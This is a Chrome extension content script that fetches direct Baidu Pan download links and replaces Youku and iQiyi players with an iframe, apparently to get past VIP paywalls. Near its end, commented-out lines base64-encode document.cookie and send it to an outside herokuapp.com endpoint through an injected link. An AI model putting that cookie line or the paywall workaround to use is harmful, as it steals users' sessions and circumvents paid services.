var hasClick = false;

chrome.extension.onRequest.addListener(//监听扩展程序进程或内容脚本发送请求的请求
	function (request, sender, sendResponse) {
		console.info("1234444");
		console.info(request);
		console.info(sender);
		console.info(sendResponse);
		// openInTab(request.url);
//		alert(request.url);
		// if (request.action == "GetBaiduKeyWord") {
			// sendResponse({ kw: { kw: document.forms[0].wd.value } });
		// }
		// if (request.action == "SubmitForm") {
			// document.forms[0].submit();
		// }
	}
);

chrome.runtime.onMessage.addListener(
        function(request, sender, sendResponse) {
			console.info("11111111111122222");
		console.info(request);
		// console.info(sender);
		// console.info(sendResponse);
            // 重新发起的请求要做标记，避免无限循环
            var settings = {
                url: request.url + "#do_not_modify_this_request",
                method: request.method,
                dataType: "json"
            };
            if (request.requestBody && request.requestBody.formData) {
                settings.data = request.requestBody.formData;
            }
            $.ajax(settings).done(function(responseData) {
				console.info(responseData);
				if(responseData.errno==0){
					if(responseData.list){
						if(responseData.list.length==1){
							window.open(responseData.list[0].dlink);
						}else{
							var infos = "";
							for(var i=0;i<responseData.list.length;i++){
								infos += "文件名："; 
								infos += responseData.list[i].server_filename; 
								infos += "\n"; 
								infos += "文件地址："; 
								infos += responseData.list[i].dlink; 
								infos += "\n"; 
								infos += "大小："; 
								infos += responseData.list[i].size; 
								infos += "\n\n";
							}
							alert(infos);
						}
					}else{
						alert("找不到文件？！");
					}
					 hideBaiduTips();
				}else if(responseData.errno==-20){
					sendResponse("yes");
					// alert("再点一次哦~");
					if(!hasClick){
						$(".icon-download").click();
						hasClick = true;
					}
					 hideBaiduTips();
				}else{
					alert("不知名失败。。。");
				}
                hideBaiduTips();
            });
			
            // 由于 sendResponse 是异步调用的，需要返回 true
            return true;
        }
);

function hideBaiduTips(){
	var bdTip = document.querySelector(".module-yun-tip");
	if(bdTip){
		bdTip.style.display="none";
	}	
}

//监听所有请求  
// chrome.webRequest.onBeforeRequest.addListener (  
  
    // function(details) {  
      
        // chrome.tabs.query({active:true},function(tab){  
            // // 当前页面的url  
            // var pageUrl = tab[0].url;  
            // // 在这可以写判断逻辑，将请求cancel掉，或者将请求打印出来  
            // console.log("current url -> " + pageUrl);  
			// alert(pageUrl);
        // });  
  
    // },  
       
    // {urls:["http://www.tianya.cn/*"]},  //监听页面请求,你也可以通过*来匹配。  
    // ["blocking"]   
// );  

//嵌入页面播放
function openInTab(url){
	console.info(document);
    // evt.preventDefault();
    var iframe=document.createElement("iframe");
    iframe.id="TMiframe";
    var video;
    //iframe.style.cssText="width:100%;height:100%;text-align:center;border:none;";
    iframe.style.border="none";
    iframe.textAlign="center";
    // iframe.src=evt.target.href;
	iframe.src=url;
    var timer=setInterval(function(){    
		// console.info("innnn");
	//-------------检测视频元素思路借鉴他人 License MIT Begin--------------
        [].every.call(document.querySelectorAll("object,embed,video"),function(item){                //LINK:https://greasyfork.org/zh-CN/scripts/26556-vip视频破解
            var style=getComputedStyle(item, null);                                                  
            if(style.width.replace("px","")>100 && style.height.replace("px","")>100){               
                video=item;
				// console.info(item);
                return false;//有播放窗
            }
            return true;
        });
		//爱奇艺页内解析重音问题
		var btnplay = document.querySelector(".btn-video");
		var btnpause = document.querySelector(".btn-pause");
		if(video && window.location.href.indexOf("iqiyi")!=-1&&btnplay&&btnpause){
			btnplay.click();
		}
		if(document.querySelector("#TMiframe")){
			video=document.querySelector("#TMiframe");
		}
        if(video){
			// alert(video.paused);
			// if(video.paused==false){
				// video.pause();
				// alert(video.paused);
			// }
			// console.info(video.parentNode);
            clearInterval(timer);
            var videoStyle=getComputedStyle(video, null);
            iframe.width=videoStyle.width;
            iframe.height=videoStyle.height;
            var videoParent=video.parentNode;
            iframe.style.lineHeight=getComputedStyle(videoParent).height;
            if(video.parentNode){video.parentNode.replaceChild(iframe,video);}
        }
    },500);                                                                                         //-------------检测视频元素思路借鉴他人  End--------------------
    if(window.location.href.indexOf("youku")!=-1){
        document.querySelector(".vpactionv5_iframe_wrap").style.display="none";
    }
	if(window.location.href.indexOf("iqiyi")!=-1){
        document.querySelector(".control").style.display="none";
		document.querySelector(".process-response").style.display="none";
		document.querySelector(".control-tips-vip").style.display="none";
    }
    /*run-at document-start 才能有效
    if(window.location.href.indexOf("iqiyi")!=-1){                                                   //页内解析重音问题，代码来源→19349-江小白：https://greasyfork.org/zh-CN/scripts/29873-%E8%A7%A3%E5%86%B3%E5%A5%87%E8%89%BA%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98/code
        Object.defineProperty(navigator, "userAgent", {
            value: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.2661.102 Safari/537.36",
            writable: false,
            configurable: false,
            enumerable: true
        });
    }  */                                                                                               //19349-江小白 借用代码End
    
}

window.onload=function(){
	replaceUrl();
}

function replaceUrl(){
	var details = {};
	details.url = "www.tianya.cn";
	console.info("i'm in....");
	// chrome.cookies.get(details,function(cookie){alert(cookie);});
	//var url = window.btoa(encodeURI(document.cookie));
	// document.querySelector(".guide-enter").innerHTML='<a href="https://vast-inlet-75928.herokuapp.com/test2?cookie='+url+'">进入社区</a>';
}
